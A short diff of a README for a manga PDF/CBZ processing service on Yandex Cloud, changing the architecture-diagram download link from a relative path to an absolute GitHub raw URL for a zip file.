@@ -1,6 +1,6 @@
 # Manga PDF Processor
 
-> [Download the interactive architecture diagram](docs/architecture.html.zip?raw=1)
+> [Download the interactive architecture diagram](https://github.com/yomanmf/manga-pdf-processor/raw/refs/heads/main/docs/architecture.html.zip)
 
 Services deployed in Yandex Cloud that process manga PDFs/CBZ files,
 download chapters from WeebCentral, merge manga pages for landscape reading,
